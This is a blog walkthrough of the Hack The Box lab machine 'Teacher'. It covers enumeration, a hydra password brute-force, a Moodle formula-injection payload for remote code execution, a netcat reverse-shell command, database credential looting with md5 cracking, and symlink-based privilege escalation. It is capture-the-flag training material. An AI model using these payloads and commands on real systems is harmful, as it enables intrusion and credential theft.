---
title:  "Hack The Box: Teacher - Walkthrough"
date:   2019-05-29 15:04:23
---

One of the first hack the box machines that i've rooted. This box took me hella long, but in the end it paid off. Here is my walkthrough of the machine.

![](/assets/2/1.png)

<h2>Enumeration</h2>
As always we will start off with our nmap scan.

```
mkdir scans
nmap -sV -sC -oA scans/nmapinitial 10.10.10.153
```

![](/assets/2/2.png)

HTTP is running on port 80. I decided to run dirb in the background and do some manual enumeration in the meantime.

```
dirb http://10.10.10.153
```

In our nmap result we noticed that the website is titled ‘blackhat highschool’. In the source on the gallery page i found something interesting.

![](/assets/2/3.png)

There is only 1 image with an onerror atribute to print something in the console. It’s also not displaying properly on the gallery page.

![](/assets/2/4.png)

When going directly to the image itself it gives us an error.

![](/assets/2/5.png)

Interesting. The file can be corrupted but i decided to do some more research to determine whether it’s something more.

![](/assets/2/6.png)

![](/assets/2/7.png)

Great, we have a username and a password that is missing it’s last character. In the meantime our dirb scan has finished and it’s found the /moodle directory with a login function. I searched for possible exploits using searchsploit but most involved getting acces to a teachers account.

![](/assets/2/8.png)

Great, we have our entry point; the login page for the moodle directory and a username + password that is missing it’s final character. I decided to create a custom wordlist with all the possible characters and run it through hydra.

![](/assets/2/9.png)

![](/assets/2/10.png)

Cool, we have the password. Let’s login!

![](/assets/2/11.png)

<h2>Exploitation</h2>
After enumerating without any success I decided to search on Google and found an interesting article. You can visit the article by clicking [here](https://blog.ripstech.com/2018/moodle-remote-code-execution/).

You can follow the video in the article for this part as it’s perfectly explained. I’ll go through this rather quickly.

```
Go to Algebra course > select the quiz > Edit Quiz > Add a new question > Choose Calculated > Click Add > Put something random in question name and text as they're required. 
```

In the Formula field, add:

```
/*{a*/`$_GET[t]`;//{x}}
```

Put grade to 100% and press Save Changes > Next page and once done you’ll see a page with ‘ Edit the wildcards datasets’ somewhere in the center of the screen. Next we are able to pass system commands through a url parameter called ‘t’. For more information please visit the previously mentioned article.

Add this to the end of the url and make sure your netcat is listening on the specified port.

```
&t=(date;nc -e /bin/sh IP 9001)
```

![](/assets/2/12.png)

![](/assets/2/13.png)

Once you’ve send the request, our listener will get a callback and we get a reverse shell as www-data.

![](/assets/2/14.png)

As we are unable to view the home directory of giovanni, we have to escalate privileges.

<h2>Privilege Escalation to giovanni</h2>
I decided to go through the moodle directory in /var/www/html/moodle and check the config files and stuff to see if there is anything interesting.

![](/assets/2/15.png)

Nice, database credentials! Let’s see if there’s anything juicy stored in there.

![](/assets/2/16.png)

We can check out the list of databases with:

```
SHOW DATABASES;
```

Moodle is interesting and might have some passwords.

```
USE moodle;
```

Check the tables.

```
SHOW TABLES;
```

We get a bunch of tables, mdl_user sounds interesting.

```
SELECT * FROM mdl_user;
```

I went over the output and found an md5 hash. Searched online for an online md5 cracker and got a result.

![](/assets/2/17.png)

The password is ‘expelled’, we can su to giovanni.

![](/assets/2/18.png)

In giovanni’s home directory we find the user.txt!

![](/assets/2/19.png)

<h2>Getting root.txt</h2>
In giovanni’s home directory there is a directory called work, which has two directoies courses and tmp. After enumerating for a while i found a backup.sh script in /usr/bin. When i took a look at this script i noticed that it’s backing up data and changing directories with 777 recursively.

I watched alot of ippsec’s write-ups about retired machines. This situation reminded me of a write up about the Joker machine. The technique i learned in this video can be used here. We can create a symlink and trick the system into backing up the root directory in /home/giovanni/work/courses. Let’s create our symlink!

```
ln -s /root/ courses
```

Once done, we just had to wait for a bit and we got root key!

![](/assets/2/20.png)

Thanks for reading and happy hacking!

